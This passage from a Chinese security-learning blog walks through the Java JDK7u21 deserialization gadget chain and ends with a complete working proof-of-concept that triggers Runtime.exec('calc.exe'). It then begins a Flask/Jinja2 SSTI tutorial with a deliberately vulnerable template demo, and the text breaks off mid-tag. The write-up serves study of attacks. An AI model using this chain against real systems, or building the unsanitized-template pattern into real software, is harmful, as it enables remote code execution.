alt="QQ截图20220316140909"></p><p>然后如果这里没有重新设置<strong>setname</strong>，会出现。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642784.png" alt="QQ截图20220316141120"></p><h2 id="TemplatesImp"><a href="#TemplatesImp" class="headerlink" title="TemplatesImp"></a>TemplatesImp</h2><p>因为之前学过了这个链子（就可以直接上手弹一个计算器了）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(Cat.class.getName());<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>            <span class="hljs-comment">// 创建 static 代码块，并插入代码</span><br>            cc.makeClassInitializer().insertBefore(cmd);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Evil&quot;</span>;<br>            cc.setName(randomClassName);<br><br>            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>            templates.newTransformer();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>并且值得注意的是，虽然大多数网上的内容都有吧这两个代码</p><p>（ <code>String randomClassName = &quot;Evil&quot;;``cc.setName(randomClassName);</code>）加入进去，但是实际上加不加都是无所谓的。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161526267.png" alt="QQ截图20220316152558"></p><p>搞清楚到这里，就可以正式开启jdk7u21了。上面已经能通过TemplatesImpl进行谈计算器了，那么现在就要考虑如何在反序列化的时候调用到<code>templates.newTransformer()</code></p><p>我个人的习惯是根据利用链子来学习。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>add<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">    ...</span><br><span class="hljs-operator">      </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (X)<br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>add<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">    ...</span><br><span class="hljs-operator">      </span><span class="hljs-constructor">Proxy(Templates)</span>.hash<span class="hljs-constructor">Code()</span> (X)<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span> (X)<br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>hash<span class="hljs-constructor">CodeImpl()</span> (X)<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (<span class="hljs-number">0</span>)<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>member<span class="hljs-constructor">ValueHashCode()</span> (X)<br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (X)<br>      <span class="hljs-constructor">Proxy(Templates)</span>.equals<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>equals<span class="hljs-constructor">Impl()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">              ...</span><br><span class="hljs-operator">                 </span><span class="hljs-comment">// TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                          ...</span><br><span class="hljs-operator">                            </span>MaliciousClass.&lt;clinit&gt;<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                              ...</span><br><span class="hljs-operator">                                </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="AnnotationInvocationHandler-equalsImpl（）"><a href="#AnnotationInvocationHandler-equalsImpl（）" class="headerlink" title="AnnotationInvocationHandler#equalsImpl（）"></a>AnnotationInvocationHandler#equalsImpl（）</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642589.png" alt="QQ截图20220316143147"></p><p>通过p神的解释，可以知道这里是经过遍历<strong>可控制类</strong>的所有方法。那么就可以实现上面所说的触发<code>templates.newTransformer()</code>。</p><h2 id="AnnotationInvocationHandler-invoke（）"><a href="#AnnotationInvocationHandler-invoke（）" class="headerlink" title="AnnotationInvocationHandler#invoke（）"></a>AnnotationInvocationHandler#invoke（）</h2><p>现在就要想到如何调用到<code>equalsImpl()</code>。<br>我们来到这里。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642244.png"></p><p>很明显，这里又要进入到<code>AnnotationInvocationHandler#invoke()</code>，一个动态代理就可。注意一下if的判断。</p><p><strong>当方法名等于“equals”，且仅有一个Object类型参数时，会调用到 equalsImp方法。</strong></p><p>所以现在需要找到一个方法，<strong>在反序列化时对proxy调用equals方法</strong>。</p><h2 id="HashSet-readObject（）"><a href="#HashSet-readObject（）" class="headerlink" title="HashSet#readObject（）"></a>HashSet#readObject（）</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161447992.png" alt="QQ截图20220316144700"></p><p>这里调试的时候在回来看。看了p神所说的这里就是（这里使用了一个HashMap，将对象保存在HashMap的key处来做去重）</p><h2 id="HashMap-put（）"><a href="#HashMap-put（）" class="headerlink" title="HashMap#put（）"></a>HashMap#put（）</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161450394.png" alt="QQ截图20220316145015"></p><p>可以看到这里调用了key.equals(k)，两个不同的对象的 i 相等时，才会执行到 key.equals(k)。（<strong>if语句判断先后顺序</strong>）</p><p>如何让让proxy对象的“哈希”，等于TemplateImpl对象的“哈希”。为什么是哈希？<strong>int hash &#x3D; hash(key);</strong><br>**int i &#x3D; indexFor(hash, table.length)**。</p><h2 id="HashMap-hash（）"><a href="#HashMap-hash（）" class="headerlink" title="HashMap#hash（）"></a>HashMap#hash（）</h2><p>跟进一下hash。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642090.png" alt="QQ截图20220316145900"></p><p>可以注意到这里判断其哈希值是否相等取决于，<strong>k.hashCode()<strong>，那么接下来自然而然要去看一下这两个类的hashCode。但是我并没有找到这两个类的</strong>hashCode</strong>。这里可以看一下p神怎么解释的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161508532.png" alt="QQ截图20220316150844"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9999999999L</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (Long.toHexString(i).hashCode() == <span class="hljs-number">0</span>) &#123;<br>                    System.out.println(Long.toHexString(i));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跑出来是<code>f5a5a608</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161515437.png" alt="QQ截图20220316151531"></p><p>这样其实一个完整的利用链就出来了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先是利用<strong>javassist</strong>生成恶意类。</p><p>为了调用<strong>transfrom()</strong>,寻找到AnnotationInvocationHandler的<strong>equalsImpl()</strong></p><p>为了调用<strong>equalsImpl()<strong>寻找到了AnnotationInvocationHandler的</strong>invoke()</strong></p><p>如何触发<strong>invoke()</strong>(采用动态代理)，为了满足if条件（找到**HashMap#put()**）</p><p>为了触发 key.equals(k)，找到proxy对象与TemplateImpl对象的“哈希”相等</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="截图p神的理解"><a href="#截图p神的理解" class="headerlink" title="截图p神的理解"></a>截图p神的理解</h3><p>在经过我调试之后我发现。开始没有注意到这里有两个<strong>hashCodeImpl()<strong>。也就是p神所说，可以控制proxy的hashcode，那么任然会进入</strong>hashCodeImpl</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161603435.png" alt="QQ截图20220316160253"></p><p>在没有进行反序列化的时候就会来到第二个**hashCodeImpl()**。跟进去看一下。（这里也就跟p神的思路连接了起来。）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161604410.png" alt="QQ截图20220316160416"></p><p>这里也就是说，在我们经过<strong>map.put</strong>值之后，我们就会进入</p><p>然后经过一些跟入不进去的调试。来到。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161643678.png" alt="QQ截图20220316160723"></p><p>继续调试，会来到，反序列化的入口点。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161611242.png" alt="QQ截图20220316161146"></p><p>这里<strong>instanceof 严格来说是Java中的一个双目运算符，用来测试一个对象是否为一个类的实例</strong>。所以我们会构造<strong>HashSet set &#x3D; new LinkedHashSet();</strong></p><p>感觉好像没有什么用。（待会试试）。因为没有修改hash值，这里不会触发<strong>key.equals(k)</strong></p><h3 id="Hash值"><a href="#Hash值" class="headerlink" title="Hash值"></a>Hash值</h3><p>接着就又会进入之前的hash判断。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161643460.png" alt="QQ截图20220316163244"></p><p>这里就将其修改成与proxy.hashCode与TemplatesImpl.hashCode联系到了一起。<br>当其相等的时候就触发了euqal方法。然后就成功连成整个链子了。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.LinkedHashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdk7u21Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(Cat.class.getName());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">zeroHashCodeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;f5a5a608&quot;</span>;<br><br>        <span class="hljs-comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(zeroHashCodeStr, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-comment">// 实例化AnnotationInvocationHandler类</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">handlerConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        handlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">tempHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);<br><br>        <span class="hljs-comment">// 为tempHandler创造一层代理</span><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(Jdk7u21Demo.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);<br><br>        <span class="hljs-comment">// 实例化HashSet，并将两个对象放进去</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>        set.add(templates);<br>        set.add(proxy);<br><br>        <span class="hljs-comment">// 将恶意templates设置到map中</span><br>        map.put(zeroHashCodeStr, templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(set);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI（像h3师傅学习）</title>
    <link href="/2022/03/15/SSTI%EF%BC%88%E5%83%8Fh3%E5%B8%88%E5%82%85%E5%AD%A6%E4%B9%A0%EF%BC%89/"/>
    <url>/2022/03/15/SSTI%EF%BC%88%E5%83%8Fh3%E5%B8%88%E5%82%85%E5%AD%A6%E4%B9%A0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>还是今天面试问道了，很无语。明明学过了还是不会。</p><p>跟着h3来学一下ssti（<a href="http://h3geeker.top/posts/b0c48792.html#toc-heading-1">h3</a>师傅写的python中的ssti）。</p><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p>跟一下<a href="https://www.w3cschool.cn/flask/flask_overview.html">w3cschool</a>学习吧。</p><h3 id="什么是Flask"><a href="#什么是Flask" class="headerlink" title="什么是Flask"></a>什么是Flask</h3><p>Flask是一个用Python编写的Web应用程序框架。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>配置一下环境，是真的离谱，<strong>挂了vpn一直报错</strong>。最后把vpn关了，一下就好了。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240237.png" alt="QQ截图20220315211150"></p><h3 id="第一个flask应用"><a href="#第一个flask应用" class="headerlink" title="第一个flask应用"></a>第一个flask应用</h3><p>必须在项目中导入Flask模块。 </p><p>Flask类的一个对象是我们的<strong>WSGI</strong>应用程序。</p><p><strong>WSGI</strong>应用程序：<strong>WSGI，全称 Web Server Gateway Interface，或者 Python Web Server Gateway Interface ，是为 Python 语言定义的 Web 服务器和 Web 应用程序或框架之间的一种简单而通用的接口。</strong></p><p><strong>wsgi是一个web组件的接口防范，wsgi将web组件分为三类：web服务器，web中间件，web应用程序</strong></p><p>Flask构造函数使用<strong>当前模块（__name __）</strong>的名称作为参数。</p><p>Flask类的**route()**函数是一个装饰器，它告诉应用程序哪个URL应该调用相关的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">app.route(rule, options)<br><br>//rule 参数表示与该函数的URL绑定。<br><br>//options 是要转发给基础Rule对象的参数列表。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152128322.png" alt="QQ截图20220315212747"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240893.png" alt="QQ截图20220315212650"></p><p>这里就简单了解一下。后续在继续学习。</p><h2 id="Jinja模板"><a href="#Jinja模板" class="headerlink" title="Jinja模板"></a>Jinja模板</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nim">&#123;<span class="hljs-meta">&#123;...&#125;</span>&#125;:装载一个变量，模板渲染时，会使用传进来的同名参数变量的代表值替换<br>&#123;%...%&#125;:装载一个控制语句<br>&#123;<span class="hljs-comment">#...#&#125;:装载一个注释，模板渲染的时候会忽视这中间的值</span><br></code></pre></td></tr></table></figure><h3 id="Jinja2中for循环的内置常量"><a href="#Jinja2中for循环的内置常量" class="headerlink" title="Jinja2中for循环的内置常量"></a>Jinja2中for循环的内置常量</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152134784.png" alt="QQ截图20220315213343"></p><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>过滤器是通过管道符<code>|</code>来使用的，例如<code>&#123;&#123;name|length&#125;&#125;</code>：来返回name的长度</p><p>过滤器想当于一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值然后把结果渲染到页面中。</p><p>回到主题！</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性</p><p><strong>如果再渲染之前，存在接受用户输入的操作，并且未经任何处理就将其作为 Web 应用模板内容的一部分，就有可能造成SSTi漏洞的产生</strong>。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/xsw6a&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br><br>    t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br>    <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240297.png" 